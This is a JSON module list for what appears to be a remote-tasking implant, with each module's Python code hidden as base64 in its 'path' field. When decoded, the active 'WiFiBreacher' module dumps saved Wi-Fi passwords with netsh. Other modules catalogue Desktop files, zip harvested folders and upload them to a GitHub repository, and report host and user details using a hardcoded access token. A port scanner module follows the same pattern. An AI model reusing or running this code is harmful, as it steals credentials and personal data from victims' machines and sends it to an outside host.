{
	"modules": [{
			"active": true,
			"name": "WiFiBreacher",
			"OS_type": "Windows",
			"duration": 20,
			"path": "Y2xhc3MgV2lGaUJyZWFjaGVyKCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc2NyaXB0X25hbWUpOgogICAgICAgIHNlbGYuc2NyaXB0X25hbWUgPSBzY3JpcHRfbmFtZQogICAgCiAgICBkZWYgY3JlYXRlX2xvZyhzZWxmLHNjcmlwdF9uYW1lLHN0YXR1cyk6CiAgICAgICAgJycnVGhpcyBmdW5jdGlvbiB3aWxsIGNyZWF0ZSBhIGxvZyAoc3VjY2VzL2ZhaWxlZCkgZGVwZW5kaW5nIG9uIHRoZSBzY3JpcHQncyByZXN1bHRzJycnCiAgICAgICAgaW1wb3J0IHNvY2tldAogICAgICAgIGltcG9ydCBwbGF0Zm9ybQogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICBpbXBvcnQgZ2V0cGFzcwogICAgICAgIGltcG9ydCBkYXRldGltZQogICAgICAgIGZyb20gZ2l0aHViIGltcG9ydCBHaXRodWIKICAgICAgICBpbXBvcnQgZGF0ZXRpbWUKICAgICAgICBBQ0NFU1NfVE9LRU4gPSdnaHBfeDIzMFEzblhMY0V1MW1aVDZQRHVERzM4TzVOMnhYM05OUVlzJwogICAgICAgIEZPTERFUl9QQVRIID0nbG9ncycKICAgICAgICBjdXJyZW50X2RhdGV0aW1lID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKICAgICAgICBjb250ZW50ID0gZiJTY3JpcHQgTmFtZToge3NjcmlwdF9uYW1lfVxuRXhlY3V0aW9uIHRpbWU6IHtjdXJyZW50X2RhdGV0aW1lfVxuU3RhdHVzOiB7c3RhdHVzfVxuXG4iCiAgICAgICAgdXNlcm5hbWUgPSBnZXRwYXNzLmdldHVzZXIoKQogICAgICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkKICAgICAgICBvc19uYW1lID0gcGxhdGZvcm0uc3lzdGVtKCkKICAgICAgICBmaWxlbmFtZSA9IG9zX25hbWUgKyAiXyIgKyBob3N0bmFtZSArICJfIiArIHVzZXJuYW1lCiAgICAgICAgZyA9IEdpdGh1YihBQ0NFU1NfVE9LRU4pCiAgICAgICAgcmVwbyA9IGcuZ2V0X3JlcG8oInJzZWN1cml0eTEyL3B5dGhvbl9vcGRyYWNodCIpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBleGlzdGluZ19maWxlID0gcmVwby5nZXRfY29udGVudHMoZiJ7Rk9MREVSX1BBVEh9L3tmaWxlbmFtZX0iKQogICAgICAgICAgICBzaGEgPSBleGlzdGluZ19maWxlLnNoYQogICAgICAgICAgICBleGlzdGluZ19jb250ZW50ID0gYmFzZTY0LmI2NGRlY29kZShleGlzdGluZ19maWxlLmNvbnRlbnQpLmRlY29kZSgpCiAgICAgICAgICAgIG5ld19jb250ZW50ID0gZXhpc3RpbmdfY29udGVudCArICdcbicgKyBjb250ZW50CiAgICAgICAgICAgIHJlcG8udXBkYXRlX2ZpbGUoZXhpc3RpbmdfZmlsZS5wYXRoLCAiVXBkYXRlIGxvZyIsIG5ld19jb250ZW50LCBzaGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBpZiAnTm90IEZvdW5kJyBpbiBzdHIoZSk6CiAgICAgICAgICAgICAgICBuZXdfZmlsZSA9IHJlcG8uY3JlYXRlX2ZpbGUoZiJ7Rk9MREVSX1BBVEh9L3tmaWxlbmFtZX0iLCAiTmV3IGxvZyIsIGNvbnRlbnQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgICcnJ1RoaXMgZnVuY3Rpb24gd2lsbCB0cnkgdG8gcmVjb3ZlciBzYXZlZCBXaUZpIHBhc3N3b3JkcyBhbmQgc2VuZCBpdHMgb3V0cHV0IHRvIEM6IFVzZXJzIFB1YmxpYyB3aWZpX2RhdGEnJycKICAgICAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgICAgIGltcG9ydCByZQogICAgICAgIGltcG9ydCBvcwogICAgICAgIHdpZmlfcGF0aCA9ICJDOlxcVXNlcnNcXFB1YmxpY1xcd2lGaV9vdXRwdXQiCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHdpZmlfcGF0aCk6CiAgICAgICAgICAgIG9zLm1ha2VkaXJzKHdpZmlfcGF0aCkKICAgICAgICBjb21tYW5kX291dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGVzJ10pLmRlY29kZSgndXRmLTgnKQogICAgICAgIHByb2ZpbGVfbmFtZXMgPSByZS5maW5kYWxsKHInOlxzKC4qKVxyJywgY29tbWFuZF9vdXRwdXQpCiAgICAgICAgd2lmaV9wYXNzd29yZHMgPSBbXQogICAgCiAgICAgICAgZm9yIG5hbWUgaW4gcHJvZmlsZV9uYW1lczoKICAgICAgICAgICAgcGFzc3dvcmRfb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyduZXRzaCcsICd3bGFuJywgJ3Nob3cnLCAncHJvZmlsZScsIG5hbWUsICdrZXk9Y2xlYXInXSkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgIHBhc3N3b3JkID0gcmUuc2VhcmNoKHInS2V5IENvbnRlbnRccyo6ICguKilccicsIHBhc3N3b3JkX291dHB1dCkKICAgICAgICAgICAgaWYgcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICB3aWZpX3Bhc3N3b3Jkcy5hcHBlbmQoKG5hbWUsIHBhc3N3b3JkLmdyb3VwKDEpKSkKCiAgICAgICAgaWYgd2lmaV9wYXNzd29yZHM6CiAgICAgICAgICAgIGZvciBuYW1lLCBwYXNzd29yZCBpbiB3aWZpX3Bhc3N3b3JkczoKICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbih3aWZpX3BhdGgsIGYie25hbWV9X3Bhc3N3b3JkLnR4dCIpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIk5ldHdvcmsgTmFtZToge25hbWV9XG4iKQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJQYXNzd29yZDoge3Bhc3N3b3JkfVxuIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCgp3aWZpX2JyZWFjaGVyID0gV2lGaUJyZWFjaGVyKCJXaUZpQnJlYWNoZXIiKQp0cnk6CiAgICB3aWZpX2JyZWFjaGVyLnJ1bigpCiAgICB3aWZpX2JyZWFjaGVyLmNyZWF0ZV9sb2cod2lmaV9icmVhY2hlci5zY3JpcHRfbmFtZSwic3VjY2VzcyIpCmV4Y2VwdDoKICAgIHdpZmlfYnJlYWNoZXIuY3JlYXRlX2xvZyh3aWZpX2JyZWFjaGVyLnNjcmlwdF9uYW1lLCJmYWlsZWQiKQ=="
		},
		{
			"active": false,
			"name": "DataSearcher",
			"OS_type": "Windows",
			"duration": 20,
			"path": "Y2xhc3MgRGF0YVNlYXJjaGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHNjcmlwdF9uYW1lKToKICAgICAgICBzZWxmLnNjcmlwdF9uYW1lID0gc2NyaXB0X25hbWUKICAgICAgICAKICAgIGRlZiBjcmVhdGVfbG9nKHNlbGYsc2NyaXB0X25hbWUsc3RhdHVzKToKICAgICAgICAnJydUaGlzIGZ1bmN0aW9uIHdpbGwgY3JlYXRlIGEgbG9nIChzdWNjZXMvZmFpbGVkKSBkZXBlbmRpbmcgb24gdGhlIHNjcmlwdCdzIHJlc3VsdHMnJycKICAgICAgICBpbXBvcnQgc29ja2V0CiAgICAgICAgaW1wb3J0IHBsYXRmb3JtCiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIGltcG9ydCBnZXRwYXNzCiAgICAgICAgaW1wb3J0IGRhdGV0aW1lCiAgICAgICAgZnJvbSBnaXRodWIgaW1wb3J0IEdpdGh1YgogICAgICAgIGltcG9ydCBkYXRldGltZQogICAgICAgIEFDQ0VTU19UT0tFTiA9J2docF94MjMwUTNuWExjRXUxbVpUNlBEdURHMzhPNU4yeFgzTk5RWXMnCiAgICAgICAgRk9MREVSX1BBVEggPSdsb2dzJwogICAgICAgIGN1cnJlbnRfZGF0ZXRpbWUgPSBkYXRldGltZS5kYXRldGltZS5ub3coKQogICAgICAgIGNvbnRlbnQgPSBmIlNjcmlwdCBOYW1lOiB7c2NyaXB0X25hbWV9XG5FeGVjdXRpb24gdGltZToge2N1cnJlbnRfZGF0ZXRpbWV9XG5TdGF0dXM6IHtzdGF0dXN9XG5cbiIKICAgICAgICB1c2VybmFtZSA9IGdldHBhc3MuZ2V0dXNlcigpCiAgICAgICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgICAgIG9zX25hbWUgPSBwbGF0Zm9ybS5zeXN0ZW0oKQogICAgICAgIGZpbGVuYW1lID0gb3NfbmFtZSArICJfIiArIGhvc3RuYW1lICsgIl8iICsgdXNlcm5hbWUKICAgICAgICBnID0gR2l0aHViKEFDQ0VTU19UT0tFTikKICAgICAgICByZXBvID0gZy5nZXRfcmVwbygicnNlY3VyaXR5MTIvcHl0aG9uX29wZHJhY2h0IikKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGV4aXN0aW5nX2ZpbGUgPSByZXBvLmdldF9jb250ZW50cyhmIntGT0xERVJfUEFUSH0ve2ZpbGVuYW1lfSIpCiAgICAgICAgICAgIHNoYSA9IGV4aXN0aW5nX2ZpbGUuc2hhCiAgICAgICAgICAgIGV4aXN0aW5nX2NvbnRlbnQgPSBiYXNlNjQuYjY0ZGVjb2RlKGV4aXN0aW5nX2ZpbGUuY29udGVudCkuZGVjb2RlKCkKICAgICAgICAgICAgbmV3X2NvbnRlbnQgPSBleGlzdGluZ19jb250ZW50ICsgJ1xuJyArIGNvbnRlbnQKICAgICAgICAgICAgcmVwby51cGRhdGVfZmlsZShleGlzdGluZ19maWxlLnBhdGgsICJVcGRhdGUgbG9nIiwgbmV3X2NvbnRlbnQsIHNoYSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGlmICdOb3QgRm91bmQnIGluIHN0cihlKToKICAgICAgICAgICAgICAgIG5ld19maWxlID0gcmVwby5jcmVhdGVfZmlsZShmIntGT0xERVJfUEFUSH0ve2ZpbGVuYW1lfSIsICJOZXcgbG9nIiwgY29udGVudCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgICcnJ1RoaXMgZnVuY3Rpb24gd2lsbCBzZWFyY2ggZm9yIGFsbCBmaWxlcyAoZXZlbiBoaWRkZW4gZmlsZXMpIGluIHRoZSBzcGVjaWZpZWQgZGlyZWN0b3J5IGFuZCBzYXZlIGl0cyBvdXRwdXQgdG8gQyBVc2VycyBQdWJsaWMgZGF0YScnJwogICAgICAgIGltcG9ydCBvcwogICAgICAgIGRpcmVjdG9yeV9wYXRoICA9IG9zLnBhdGguZXhwYW5kdXNlcihyIn5cRGVza3RvcCIpCiAgICAgICAgZ2NpX3BhdGggPSAiQzpcXFVzZXJzXFxQdWJsaWNcXGdjaV9vdXRwdXQiCiAgICAgICAgb3V0cHV0X2ZpbGUgPSAiQzpcXFVzZXJzXFxQdWJsaWNcXGdjaV9vdXRwdXRcXGdjaV9vdXRwdXQudHh0IgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhnY2lfcGF0aCk6CiAgICAgICAgICAgIG9zLm1ha2VkaXJzKGdjaV9wYXRoKQogICAgICAgIHdpdGggb3BlbihvdXRwdXRfZmlsZSwgJ3cnKSBhcyBmOgogICAgICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkaXJlY3RvcnlfcGF0aCk6CiAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGZpbGVfcGF0aCArICdcbicpCgpkYXRhX3NlYXJjaGVyID0gRGF0YVNlYXJjaGVyKCdEYXRhU2VhcmNoZXInKQp0cnk6CiAgICBkYXRhX3NlYXJjaGVyLnJ1bigpCiAgICBkYXRhX3NlYXJjaGVyLmNyZWF0ZV9sb2coZGF0YV9zZWFyY2hlci5zY3JpcHRfbmFtZSwic3VjY2VzcyIpCmV4Y2VwdDoKICAgIGRhdGFfc2VhcmNoZXIuY3JlYXRlX2xvZyhkYXRhX3NlYXJjaGVyLnNjcmlwdF9uYW1lLCJmYWlsZWQiKQ=="
		},
		{
			"active": false,
			"name": "DataExtractor",
			"OS_type": "Windows",
			"duration": 20,
			"path": "Y2xhc3MgRGF0YUV4dHJhY3RvcigpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsc2NyaXB0X25hbWUpOgogICAgICAgIHNlbGYuc2NyaXB0X25hbWUgPSBzY3JpcHRfbmFtZQogICAgICAgIAogICAgZGVmIHByZXBhcmVfZm9sZGVycyhzZWxmLGRpcmVjdG9yeSwgc3BlY2lmaWVkX2ZvbGRlcnMpOgogICAgICAgICcnJ1RoaXMgZnVuY3Rpb24gaXMgcmVzcG9uc2libGUgZm9yIHNlYXJjaGluZyBmb3IgdGhlIHNwZWNpZmllZCBmb2xkZXJzIGFuZCByZXR1cm5pbmcgdHJ1ZSBpZiB0aGV5IHdlcmUgZm91bmQuIFRoaXMgZnVuY3Rpb24gd2lsbCBhbHNvIGNhbGwgdGhlIGNyZWF0ZSB6aXAgZnVuY3Rpb24nJycKICAgICAgICBpbXBvcnQgb3MKICAgICAgICBmb3VuZF9mb2xkZXJzID0gRmFsc2UKICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkaXJlY3RvcnkpOgogICAgICAgICAgICBmb3IgZm9sZGVyIGluIGRpcnM6CiAgICAgICAgICAgICAgICBmb2xkZXJfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmb2xkZXIpCiAgICAgICAgICAgICAgICBpZiBmb2xkZXIgaW4gc3BlY2lmaWVkX2ZvbGRlcnM6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZm9sZGVyX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgZm91bmRfZm9sZGVycyA9IFRydWUgICAgICAgICAgICAgICAgIAogICAgICAgIGlmIG5vdCBmb3VuZF9mb2xkZXJzOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICBzZWxmLmNyZWF0ZV96aXAoZGlyZWN0b3J5KQogICAgICAgIHJldHVybiBUcnVlCgogICAgZGVmIGNyZWF0ZV96aXAoc2VsZixzb3VyY2VfZGlyKToKICAgICAgICAnJydUaGlzIGZ1bmN0aW9uIHdpbGwgYmUgY2FsbGVkIGluIHRoZSBwcmVwYXJlX2ZvbGRlcnMgZnVuY3Rpb24gaW4gY2FzZSB0aGF0IGZ1bmN0aW9uIHJldHVybnMgdHJ1ZS4gVGhpcyBmdW5jdGlvbiB3aWxsIHppcCB0aGUgZm91bmQgZm9sZGVycycnJwogICAgICAgIGltcG9ydCBzaHV0aWwKICAgICAgICBzaHV0aWwubWFrZV9hcmNoaXZlKHInQzpcVXNlcnNcUHVibGljXGZpbGVzJywgJ3ppcCcsIHNvdXJjZV9kaXIpCgogICAgZGVmIHNlbmRfZmlsZXMoc2VsZik6CiAgICAgICAgJycnVGhpcyBmdW5jdGlvbiB3aWxsIHNlbmQgdGhlIGV4dHJhY3RlZCBmaWxlcyB0byBteSBnaXQgcmVwbycnJwogICAgICAgIGltcG9ydCByZXF1ZXN0cwogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9yc2VjdXJpdHkxMi9weXRob25fb3BkcmFjaHQvY29udGVudHMvZXh0cmFjdGVkX2ZpbGVzL2ZpbGVzLnppcCIKICAgICAgICBoZWFkZXJzID0geyJBdXRob3JpemF0aW9uIjogIkJlYXJlciBnaHBfeDIzMFEzblhMY0V1MW1aVDZQRHVERzM4TzVOMnhYM05OUVlzIn0gIAogICAgICAgIGZpbGVfcGF0aCA9IHIiQzpcVXNlcnNcUHVibGljXGZpbGVzLnppcCIgICMgUmVwbGFjZSB3aXRoIHRoZSBhY3R1YWwgcGF0aCB0byB5b3VyIHppcCBmaWxlCiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZmlsZToKICAgICAgICAgICAgZmlsZV9jb250ZW50ID0gZmlsZS5yZWFkKCkKICAgICAgICAgICAgZW5jb2RlZF9jb250ZW50ID0gYmFzZTY0LmI2NGVuY29kZShmaWxlX2NvbnRlbnQpLmRlY29kZSgidXRmLTgiKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJtZXNzYWdlIjogIlVwbG9hZCBmaWxlIiwKICAgICAgICAgICAgImNvbnRlbnQiOiBlbmNvZGVkX2NvbnRlbnQKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wdXQodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249ZGF0YSkKICAgICAgICAKZm9sZGVyX2RpcmVjdG9yeSA9IHInQzpcVXNlcnNcUHVibGljJwpzcGVjaWZpZWRfZm9sZGVyc19saXN0ID0gWyJ3aUZpX291dHB1dCIsICJzc2hfb3V0cHV0IiwgImdhdGhlcl9pbmZvIl0KZGF0YUV4dHJhY3RvciA9IERhdGFFeHRyYWN0b3IoIkRhdGFFeHRyYWN0b3IiKQoKaWYgZGF0YUV4dHJhY3Rvci5wcmVwYXJlX2ZvbGRlcnMoZm9sZGVyX2RpcmVjdG9yeSwgc3BlY2lmaWVkX2ZvbGRlcnNfbGlzdCk6CiAgICBkYXRhRXh0cmFjdG9yLnNlbmRfZmlsZXMoKQplbHNlOgogICAgcHJpbnQoIk5vdGhpbmcgdG8gZXh0cmFjdCIp"
		},
		{
			"active": true,
			"name": "Linux",
			"OS_type": "Windows",
			"duration": 20,
			"path": "Y2xhc3MgSGVsbG9Xb3JsZDoKICAgIGRlZiBwcmludF9oZWxsb193b3JsZChzZWxmKToKICAgICAgICBwcmludCgiSGVsbG8sIHdvcmxkISIpCgpoZWxsbyA9IEhlbGxvV29ybGQoKQpoZWxsby5wcmludF9oZWxsb193b3JsZCgp"
		},
		{
			"active": false,
			"name": "Portscanner",
			"OS_type": "Linux",
			"duration": 20,
			"path": "Y2xhc3MgSGVsbG9Xb3JsZDoKICAgIGRlZiBwcmludF9oZWxsb193b3JsZChzZWxmKToKICAgICAgICBwcmludCgiSGVsbG8sIHdvcmxkISIpCgpoZWxsbyA9IEhlbGxvV29ybGQoKQpoZWxsby5wcmludF9oZWxsb193b3JsZCgp"
		},
		{
			"active": false,
			"name": "CommandRunner",
			"OS_type": "Linux",
			"duration": 20,
			"path": "aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHNvY2tldAppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IGJhc2U2NAppbXBvcnQgZ2V0cGFzcwppbXBvcnQgZGF0ZXRpbWUKZnJvbSBnaXRodWIgaW1wb3J0IEdpdGh1YgppbXBvcnQgZGF0ZXRpbWUKCmNsYXNzIFBvcnRTY2FubmVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHNjcmlwdF9uYW1lLGhvc3QsIHN0YXJ0X3BvcnQsIGVuZF9wb3J0KToKICAgICAgICBzZWxmLnNjcmlwdF9uYW1lID0gc2NyaXB0X25hbWUKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5zdGFydF9wb3J0ID0gc3RhcnRfcG9ydAogICAgICAgIHNlbGYuZW5kX3BvcnQgPSBlbmRfcG9ydAogICAgCiAgICBkZWYgY3JlYXRlX2xvZyhzZWxmLHNjcmlwdF9uYW1lLHN0YXR1cyk6CiAgICAgICAgJycnVGhpcyBmdW5jdGlvbiB3aWxsIGNyZWF0ZSBhIGxvZyAoc3VjY2VzL2ZhaWxlZCkgZGVwZW5kaW5nIG9uIHRoZSBzY3JpcHQncyByZXN1bHRzJycnCiAgICAgICAgQUNDRVNTX1RPS0VOID0nZ2hwX3gyMzBRM25YTGNFdTFtWlQ2UER1REczOE81TjJ4WDNOTlFZcycKICAgICAgICBGT0xERVJfUEFUSCA9J2xvZ3MnCiAgICAgICAgY3VycmVudF9kYXRldGltZSA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpCiAgICAgICAgY29udGVudCA9IGYiU2NyaXB0IE5hbWU6IHtzY3JpcHRfbmFtZX1cbkV4ZWN1dGlvbiB0aW1lOiB7Y3VycmVudF9kYXRldGltZX1cblN0YXR1czoge3N0YXR1c31cblxuIgogICAgICAgIHVzZXJuYW1lID0gZ2V0cGFzcy5nZXR1c2VyKCkKICAgICAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAgICAgICAgb3NfbmFtZSA9IHBsYXRmb3JtLnN5c3RlbSgpCiAgICAgICAgZmlsZW5hbWUgPSBvc19uYW1lICsgIl8iICsgaG9zdG5hbWUgKyAiXyIgKyB1c2VybmFtZQogICAgICAgIGcgPSBHaXRodWIoQUNDRVNTX1RPS0VOKQogICAgICAgIHJlcG8gPSBnLmdldF9yZXBvKCJyc2VjdXJpdHkxMi9weXRob25fb3BkcmFjaHQiKQogICAgICAgIHRyeToKICAgICAgICAgICAgZXhpc3RpbmdfZmlsZSA9IHJlcG8uZ2V0X2NvbnRlbnRzKGYie0ZPTERFUl9QQVRIfS97ZmlsZW5hbWV9IikKICAgICAgICAgICAgc2hhID0gZXhpc3RpbmdfZmlsZS5zaGEKICAgICAgICAgICAgZXhpc3RpbmdfY29udGVudCA9IGJhc2U2NC5iNjRkZWNvZGUoZXhpc3RpbmdfZmlsZS5jb250ZW50KS5kZWNvZGUoKQogICAgICAgICAgICBuZXdfY29udGVudCA9IGV4aXN0aW5nX2NvbnRlbnQgKyAnXG4nICsgY29udGVudAogICAgICAgICAgICByZXBvLnVwZGF0ZV9maWxlKGV4aXN0aW5nX2ZpbGUucGF0aCwgIlVwZGF0ZSBsb2ciLCBuZXdfY29udGVudCwgc2hhKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgaWYgJ05vdCBGb3VuZCcgaW4gc3RyKGUpOgogICAgICAgICAgICAgICAgbmV3X2ZpbGUgPSByZXBvLmNyZWF0ZV9maWxlKGYie0ZPTERFUl9QQVRIfS97ZmlsZW5hbWV9IiwgIk5ldyBsb2ciLCBjb250ZW50KQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgJycnVGhpcyBmdW5jdGlvbiB3aWxsIGRpc3BsYXkgYWxsIHRoZSBvcGVuIHBvcnRzIGluIHRoZSBzcGVjaWZpZWQgaG9zdCBhbmQgcG9ydHMnJycKICAgICAgICBvcGVuX3BvcnRzID0gW10KICAgICAgICBvdXRwdXRfZmlsZV9wYXRoID0gIi90bXAvcG9ydHNjYW5uZXIvcG9ydHNjYW5uZXIudHh0IgogICAgICAgIGRlc3RpbmF0aW9uX2RpcmVjdG9yeSA9ICIvdG1wL3BvcnRzY2FubmVyIgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkZXN0aW5hdGlvbl9kaXJlY3RvcnkpOgogICAgICAgICAgICBvcy5tYWtlZGlycyhkZXN0aW5hdGlvbl9kaXJlY3RvcnkpCiAgICAgICAgb3V0cHV0X2ZpbGUgPSBvcGVuKG91dHB1dF9maWxlX3BhdGgsICJ3IikgIAogICAgICAgIGZvciBwb3J0IGluIHJhbmdlKHNlbGYuc3RhcnRfcG9ydCwgc2VsZi5lbmRfcG9ydCArIDEpOgogICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICBzb2NrLnNldHRpbWVvdXQoMSkgIAogICAgICAgICAgICByZXN1bHQgPSBzb2NrLmNvbm5lY3RfZXgoKHNlbGYuaG9zdCwgcG9ydCkpCiAgICAgICAgICAgIGlmIHJlc3VsdCA9PSAwOgogICAgICAgICAgICAgICAgb3Blbl9wb3J0cy5hcHBlbmQocG9ydCkKICAgICAgICAgICAgICAgIG91dHB1dF9maWxlLndyaXRlKGYiUG9ydCB7cG9ydH0gaXMgb3Blbi5cbiIpCiAgICAgICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIG91dHB1dF9maWxlLmNsb3NlKCkKCgpzY2FubmVyID0gUG9ydFNjYW5uZXIoJ1BvcnRzY2FubmVyJywnbG9jYWxob3N0JywgMSwgNjU1MzUpCnRyeToKICAgIHNjYW5uZXIucnVuKCkKICAgIHNjYW5uZXIuY3JlYXRlX2xvZyhzY2FubmVyLnNjcmlwdF9uYW1lLCJzdWNjZXNzIikKZXhjZXB0OgogICAgc2Nhbm5lci5jcmVhdGVfbG9nKHNjYW5uZXIuc2NyaXB0X25hbWUsImZhaWxlZCIp"
		}
	]
}
